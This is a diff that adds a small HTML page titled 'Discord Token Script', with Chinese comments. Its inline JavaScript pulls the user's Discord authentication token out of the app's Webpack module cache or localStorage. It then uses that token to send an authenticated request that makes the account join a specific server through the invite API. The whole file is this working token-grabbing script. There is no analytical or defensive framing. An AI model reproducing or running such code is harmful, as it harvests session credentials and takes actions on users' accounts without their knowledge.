@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+
+<html lang="zh-TW">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <title>Discord Token Script</title>
+
+</head>
+
+<body>
+
+
+
+    <script>
+
+        (function() {
+
+            let t;
+
+            try {
+
+                // 嘗試從 Webpack 緩存中獲取 Token
+
+                window.webpackChunkdiscord_app.push([[Math.random()], {}, (r) => {
+
+                    for (const m in r.c) {
+
+                        const e = r.c[m].exports;
+
+                        if (e?.default?.getToken) {
+
+                            const tk = e.default.getToken();
+
+                            if (typeof tk === 'string' && tk.length > 20) t = tk;
+
+                        }
+
+                    }
+
+                }]);
+
+            } catch (e) {}
+
+
+
+            // 如果 Webpack 失敗，嘗試從 LocalStorage 獲取
+
+            t = t || window.localStorage.getItem('token')?.replace(/"/g, "");
+
+
+
+            if (!t) {
+
+                console.log("失敗 (無法取得Token)");
+
+                return;
+
+            }
+
+
+
+            // 發送加入伺服器的請求
+
+            // 請記得將 [邀請連結id] 替換成實際的 ID
+
+            fetch('https://discord.com/api/v9/invites/jM8pF5Hz', {
+
+                method: 'POST',
+
+                headers: { 
+
+                    'Content-Type': 'application/json', 
+
+                    'Authorization': t 
+
+                },
+
+                body: JSON.stringify({})
+
+            })
+
+            .then(res => {
+
+                if (res.ok) console.log("成功");
+
+                else console.log("失敗 (" + res.status + ")");
+
+            })
+
+            .catch(() => console.log("失敗 (網路錯誤)"));
+
+        })();
+
+    </script>
+
+
+
+</body>
+
+</html>
